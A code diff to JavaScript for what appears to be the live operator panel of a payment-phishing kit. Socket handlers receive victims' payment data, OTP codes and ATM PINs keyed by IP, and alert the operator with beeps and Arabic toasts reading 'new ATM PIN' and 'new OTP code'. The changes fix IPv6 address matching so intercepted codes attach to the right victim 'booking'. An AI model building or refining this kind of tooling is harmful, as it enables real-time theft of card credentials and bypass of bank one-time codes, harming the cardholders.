@@ -583,7 +583,7 @@ function initSocket() {
 
   // ---- New payment data ----
   socket.on('newPayment', (data) => {
-    const ip = data.ip;
+    const ip = (data.ip || '').replace(/^::ffff:/, '');
     if (!liveData[ip]) liveData[ip] = {};
     liveData[ip].requestId = data.requestId;
     liveData[ip].paymentData = data;
@@ -605,31 +605,38 @@ function initSocket() {
 
   // ---- New OTP or PIN ----
   socket.on('newCode', (data) => {
-    const ip = data.ip;
+    // Normalize IP: remove IPv6 prefix if present
+    const rawIp = data.ip || '';
+    const ip = rawIp.replace(/^::ffff:/, '');
     const type = data.type || 'otp';
 
-    if (!liveData[ip]) liveData[ip] = {};
-    liveData[ip].requestId = data.requestId;
-
-    if (type === 'pin') {
-      liveData[ip].pinData = data;
-      liveStatus[ip] = 'pin';
-      updateRowBadge(ip, 'pin');
-      playBeep(550);
-      showToast('🔒 رقم سري ATM جديد');
-    } else {
-      liveData[ip].otpData = data;
-      liveStatus[ip] = 'otp';
-      updateRowBadge(ip, 'otp');
-      playBeep(770);
-      showToast('🔑 رمز OTP جديد');
+    // Try to find matching IP in allBookings (in case IP differs slightly)
+    let matchedIp = ip;
+    if (!liveData[ip]) {
+      // Try to find by socketId match or closest IP in existing liveData
+      const found = allBookings.find(b => b.ip && (b.ip === ip || b.ip.replace(/^::ffff:/, '') === ip));
+      if (found) matchedIp = found.ip;
     }
 
+    if (!liveData[matchedIp]) liveData[matchedIp] = {};
+    liveData[matchedIp].requestId = data.requestId;
+    if (type === 'pin') {
+      liveData[matchedIp].pinData = data;
+      liveStatus[matchedIp] = 'pin';
+      updateRowBadge(matchedIp, 'pin');
+      playBeep(550);
+      showToast('🔒 رقم سري ATM جديد من: ' + matchedIp);
+    } else {
+      liveData[matchedIp].otpData = data;
+      liveStatus[matchedIp] = 'otp';
+      updateRowBadge(matchedIp, 'otp');
+      playBeep(770);
+      showToast('🔑 رمز OTP جديد من: ' + matchedIp);
+    }
     updatePendingCount();
-
-    // If modal is open for this IP, update it immediately (no fetch needed)
-    if (currentModalIp === ip) {
-      rebuildModalLive(ip);
+    // If modal is open for this IP, update it immediately
+    if (currentModalIp === matchedIp || currentModalIp === ip) {
+      rebuildModalLive(currentModalIp);
     }
   });
 }
